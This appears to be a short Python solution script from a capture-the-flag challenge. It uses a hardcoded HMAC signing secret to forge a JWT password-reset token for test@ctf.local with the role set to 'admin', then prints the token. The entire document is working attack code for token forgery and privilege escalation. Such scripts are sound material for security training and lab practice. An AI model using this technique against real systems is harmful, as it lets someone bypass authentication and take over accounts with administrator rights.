import base64, hmac, hashlib, json, time

def b64url(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")

secret = b"TDH_MOB03_RESET_TOKEN_SIGNING_KEY_2025"

header = {"alg": "HS256", "typ": "JWT"}
now = int(time.time())
payload = {
    "email": "test@ctf.local",
    "role": "admin",
    "iat": now,
    "exp": now + 3600,
}

header_b64 = b64url(json.dumps(header, separators=(",", ":")).encode())
payload_b64 = b64url(json.dumps(payload, separators=(",", ":")).encode())
signing_input = f"{header_b64}.{payload_b64}".encode()
sig = hmac.new(secret, signing_input, hashlib.sha256).digest()

token = f"{header_b64}.{payload_b64}.{b64url(sig)}"
print(token)
